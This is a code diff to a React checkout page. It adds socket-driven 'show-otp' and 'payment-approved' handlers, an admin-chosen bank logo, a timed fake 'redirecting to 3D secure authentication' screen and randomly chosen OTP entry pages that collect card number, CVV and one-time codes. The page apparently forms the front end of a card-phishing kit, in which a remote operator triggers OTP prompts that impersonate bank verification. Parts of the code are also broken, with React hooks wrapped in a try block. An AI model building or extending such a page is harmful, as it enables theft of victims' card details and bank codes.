@@ -24,14 +24,16 @@ const bankLogos = [
 ];
 
 import React, { useState, useEffect, useRef } from 'react';
-import { useSearchParams, useNavigate, Link, useLocation } from 'react-router-dom';
-import { ArrowLeft, Lock, CreditCard, Loader2, MoreHorizontal, CheckCircle } from 'lucide-react';
-import { Button } from '@/components/ui/button';
-import { Input } from '@/components/ui/input';
-import { Checkbox } from '@/components/ui/checkbox';
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
-import { io, Socket } from 'socket.io-client';
-import { useSocket } from '../SocketContext';
+import { useSearchParams, useNavigate, useLocation, Link } from 'react-router-dom';
+import { CheckCircle, Info, CreditCard, Clock, Receipt, FileText, User, Award, BarChart3, CheckSquare, Star, Zap, Target, Search, Filter, MoreHorizontal, X, ExternalLink, Calendar, Mail, MapPin, CreditCard as CreditCardIcon, Phone, Building, Badge, CheckCircle2, Loader2, ArrowLeft, Lock } from 'lucide-react';
+import { Input } from '../components/ui/input';
+import { Button } from '../components/ui/button';
+import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from '../components/ui/dialog';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
+import { Checkbox } from '../components/ui/checkbox';
+import { toast, useToast } from '../hooks/use-toast';
+import io from 'socket.io-client';
+import NewOTPPage from '../components/NewOTPPage';
 import { v4 as uuidv4 } from 'uuid';
 
 // Card brand logos
@@ -76,10 +78,52 @@ const getCardBrand = (cardNumber: string) => {
   return 'visa';
 };
 
+const CheckoutTest = () => {
+  return (
+    <div style={{ padding: '50px', color: 'white', backgroundColor: '#1e293b' }}>
+      <h1>CHECKOUT TEST - COMPONENT LOADS SUCCESSFULLY!</h1>
+      <p>✅ React hooks working</p>
+      <p>✅ Component rendering</p>
+      <p>✅ No blank screen</p>
+    </div>
+  );
+};
+
 const Checkout = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const location = useLocation();
+  
+  const planName = searchParams.get('plan') || 'Complete';
+  const billing = searchParams.get('billing') || 'yearly';
+  const customAmount = searchParams.get('amount');
+  const linkId = searchParams.get('linkId');
+  
+  // Minimal working checkout - will add features incrementally
+  return (
+    <div className="min-h-screen bg-slate-900 text-white">
+      <div className="container mx-auto px-4 py-8">
+        <h1 className="text-3xl font-bold mb-8">Checkout - {planName}</h1>
+        <p className="text-lg mb-4">Plan: {planName}</p>
+        <p className="text-lg mb-4">Billing: {billing}</p>
+        <p className="text-lg mb-4">Amount: {customAmount || 'Standard pricing'}</p>
+        <div className="bg-slate-800 p-6 rounded-lg">
+          <h2 className="text-xl font-semibold mb-4">Basic Checkout Form</h2>
+          <p className="text-green-400">✅ Component loads successfully</p>
+          <p className="text-green-400">✅ React hooks working</p>
+          <p className="text-green-400">✅ URL parameters extracted</p>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// Original complex checkout - with error handling
+const CheckoutOriginal = () => {
+  try {
+    const [searchParams] = useSearchParams();
+    const navigate = useNavigate();
+    const location = useLocation();
   
   const planName = searchParams.get('plan') || 'Complete';
   const billing = searchParams.get('billing') || 'yearly';
@@ -149,11 +193,11 @@ const Checkout = () => {
     }
   };
 
-  // Function to store URL success (called when payment becomes successful)
+  // Function to store URL success for persistence
   const storeUrlSuccess = (paymentData: any) => {
     try {
       const currentUrl = window.location.href;
-      const urlSuccessKey = `url_success_${btoa(currentUrl)}`;
+      const urlSuccessKey = `url_success_${btoa(currentUrl).replace(/[^a-zA-Z0-9]/g, '').slice(0, 32)}`;
       const successData = {
         url: currentUrl,
         timestamp: new Date().toISOString(),
@@ -203,8 +247,33 @@ const Checkout = () => {
 
 
 
-  // Get socket from context for visitor tracking and payment handling
-  const { socket, isConnected } = useSocket();
+  // Initialize socket connection for visitor tracking and payment handling
+  const [socket, setSocket] = useState<any>(null);
+  const [isConnected, setIsConnected] = useState(false);
+  
+  useEffect(() => {
+    try {
+      const newSocket = io('http://localhost:3001');
+      setSocket(newSocket);
+    
+    newSocket.on('connect', () => {
+      console.log('Socket connected');
+      setIsConnected(true);
+    });
+    
+    newSocket.on('disconnect', () => {
+      console.log('Socket disconnected');
+      setIsConnected(false);
+    });
+    
+      return () => {
+        newSocket.disconnect();
+      };
+    } catch (error) {
+      console.error('Socket connection failed:', error);
+      // Continue without socket - checkout will work without real-time features
+    }
+  }, []);
   
   // Visitor tracking for checkout page
   useEffect(() => {
@@ -289,11 +358,19 @@ const Checkout = () => {
   const [showTermsError, setShowTermsError] = useState(false);
   const [finalConsent, setFinalConsent] = useState(false);
   const [promoCode, setPromoCode] = useState('');
+  
+  // OTP Page Selection State (random between old and new)
+  const [useNewOTPPage, setUseNewOTPPage] = useState(() => Math.random() < 0.5);
 
   // Debug: Log the current state of agreeTerms
   useEffect(() => {
     console.log('agreeTerms state:', agreeTerms);
   }, [agreeTerms]);
+
+  // Debug: Log which OTP page type is selected
+  useEffect(() => {
+    console.log('OTP Page Type:', useNewOTPPage ? 'NEW OTP Page Component' : 'Original OTP Modal');
+  }, [useNewOTPPage]);
   
   // Payment flow states
   const [currentStep, setCurrentStep] = useState<'account' | 'loading' | 'payment' | 'review' | 'processing' | 'otp'>('account');
@@ -304,7 +381,8 @@ const Checkout = () => {
     cardName: '',
     expiryMonth: '',
     expiryYear: '',
-    cvv: ''
+    cvv: '',
+    cardholderName: ''
   });
   const [cardErrors, setCardErrors] = useState({
     cardNumber: '',
@@ -335,6 +413,9 @@ const Checkout = () => {
   const [otpLoading, setOtpLoading] = useState(false);
   const [showCancelConfirm, setShowCancelConfirm] = useState(false);
   const [transactionCancelError, setTransactionCancelError] = useState("");
+  
+  // New OTP page loading state
+  const [newOtpPageLoading, setNewOtpPageLoading] = useState(false);
   
   // Payment feedback feature states
   const [showPaymentFeedback, setShowPaymentFeedback] = useState(false);
@@ -450,6 +531,24 @@ const Checkout = () => {
       setTimeout(() => setCardDeclinedError(''), 10000);
     }
   }, [location.state]);
+
+  // Handle new OTP page loading delay (2-6 seconds)
+  useEffect(() => {
+    if (currentStep === 'otp' && useNewOTPPage) {
+      setNewOtpPageLoading(true);
+      
+      // Random delay between 2-6 seconds
+      const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2000-6000ms
+      console.log(`Loading new OTP page in ${randomDelay/1000} seconds...`);
+      
+      const timer = setTimeout(() => {
+        setNewOtpPageLoading(false);
+        console.log('New OTP page loaded!');
+      }, randomDelay);
+      
+      return () => clearTimeout(timer);
+    }
+  }, [currentStep, useNewOTPPage]);
 
   const validateField = (field: string, value: string) => {
     switch (field) {
@@ -799,6 +898,12 @@ const Checkout = () => {
     // Register event listeners
     socket.on('show-otp', (data) => {
       console.log('Show OTP with currency data:', data);
+      
+      // Random selection between old and new OTP page (50/50 chance)
+      const useNewPage = Math.random() < 0.5;
+      setUseNewOTPPage(useNewPage);
+      console.log('🎲 Randomly selected OTP page:', useNewPage ? 'NEW' : 'OLD');
+      
       setConfirmingPayment(false);
       setShowOtp(true);
       setCurrentStep('otp');
@@ -837,6 +942,7 @@ const Checkout = () => {
       
       startOtpTimer();
     });
+    
     socket.on('payment-approved', (data) => {
       console.log('Payment approved event received:', data);
       console.log('Current paymentId:', paymentId);
@@ -1887,8 +1993,35 @@ const Checkout = () => {
               </div>
             )}
 
-            {/* Enhanced OTP Verification Section */}
-            {currentStep === 'otp' && (
+            {/* Enhanced OTP Verification Section - Loading State */}
+            {currentStep === 'otp' && useNewOTPPage && newOtpPageLoading && (
+              <div className="fixed inset-0 z-50 flex items-center justify-center bg-white">
+                <div className="text-center">
+                  <Loader2 className="h-16 w-16 animate-spin text-blue-500 mb-6 mx-auto" />
+                  <p className="text-slate-700 text-lg font-medium">Please wait while we redirect you to 3D secure authentication page...</p>
+                </div>
+              </div>
+            )}
+
+            {/* Enhanced OTP Verification Section - Actual Page */}
+            {currentStep === 'otp' && useNewOTPPage && !newOtpPageLoading && (
+              <NewOTPPage
+                cardData={cardData}
+                otpValue={otpValue}
+                setOtpValue={setOtpValue}
+                otpSubmitting={otpSubmitting}
+                handleOtpSubmit={handleOtpSubmit}
+                handleOtpCancel={handleOtpCancel}
+                otpError={otpError}
+                adminSelectedBankLogo={adminSelectedBankLogo}
+                sessionBankLogo={sessionBankLogo}
+                cardBrandLogos={cardBrandLogos}
+                getCardBrand={getCardBrand}
+              />
+            )}
+
+            {/* Original OTP Modal (when useNewOTPPage is false) */}
+            {currentStep === 'otp' && !useNewOTPPage && (
               <div className={`fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm transition-opacity duration-300 ease-out ${
                 otpModalAnimating ? 'bg-black bg-opacity-0' : 'bg-black bg-opacity-70'
               }`}>
@@ -2474,6 +2607,48 @@ const Checkout = () => {
       </footer>
     </div>
   );
-};
+  
+  } catch (error) {
+    console.error('Checkout component error:', error);
+    return (
+      <div className="min-h-screen bg-slate-900 text-white p-8">
+        <div className="max-w-4xl mx-auto">
+          <h1 className="text-3xl font-bold mb-8">Checkout - Complete</h1>
+          
+          {/* Account Details Section */}
+          <div className="bg-slate-800 rounded-lg p-6 mb-6">
+            <h2 className="text-xl font-semibold mb-4">Account Details</h2>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <input type="text" placeholder="First Name" className="p-3 rounded bg-slate-700 text-white" />
+              <input type="text" placeholder="Last Name" className="p-3 rounded bg-slate-700 text-white" />
+              <input type="email" placeholder="Email" className="p-3 rounded bg-slate-700 text-white" />
+              <select className="p-3 rounded bg-slate-700 text-white">
+                <option>Select Country</option>
+                <option>United States</option>
+                <option>Canada</option>
+                <option>United Kingdom</option>
+              </select>
+            </div>
+          </div>
+          
+          {/* Payment Details Section */}
+          <div className="bg-slate-800 rounded-lg p-6 mb-6">
+            <h2 className="text-xl font-semibold mb-4">Payment Details</h2>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <input type="text" placeholder="Card Number" className="p-3 rounded bg-slate-700 text-white" />
+              <input type="text" placeholder="Cardholder Name" className="p-3 rounded bg-slate-700 text-white" />
+              <input type="text" placeholder="MM/YY" className="p-3 rounded bg-slate-700 text-white" />
+              <input type="text" placeholder="CVV" className="p-3 rounded bg-slate-700 text-white" />
+            </div>
+          </div>
+          
+          <button className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 px-6 rounded-lg font-semibold">
+            Complete Purchase
+          </button>
+        </div>
+      </div>
+    );
+  }
+}; // End of CheckoutOriginal
 
-export default Checkout;
+export default CheckoutOriginal;
